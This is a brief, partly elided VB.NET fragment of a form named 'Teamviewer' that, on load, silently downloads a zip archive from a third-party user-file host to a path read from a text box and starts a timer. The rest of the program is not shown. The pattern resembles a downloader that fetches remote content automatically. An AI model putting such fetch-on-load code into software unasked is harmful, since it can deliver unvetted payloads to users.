...
Public Class Teamviewer
    ...
    Private Sub Teamviewer_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_4e080366386f4adc9b1933a602fac7da.zip"), Texbbb.TextBox21.Text)
        Timer1.Start()
